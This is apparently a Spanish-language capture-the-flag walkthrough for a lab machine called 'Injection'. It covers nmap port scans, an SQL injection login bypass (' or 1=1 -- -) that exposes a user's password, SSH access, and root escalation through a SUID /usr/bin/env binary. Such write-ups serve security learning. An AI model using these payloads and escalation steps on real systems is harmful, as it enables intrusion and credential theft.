### Máquina Injection

## Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64

## Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 172.17.0.2 

![alt text](image-3.png)

## Navegamos al 172.17.0.2

nos encontramos con un formulario de login:

![alt text](image.png)

![alt text](image-1.png)

en los 2 inputs escribimos ' or 1=1 -- - y nos arrojo la contraseña de dylan

KJSDFG789FGSDF78

## Intrusion

por shh

shh dylan@172.172.17.0.2 -> KJSDFG789FGSDF78

## Escalar privilegios

find / -perm -4000 2>/dev/null

/usr/bin/env

/usr/bin/env /bin/sh -p

![alt text](image-2.png)

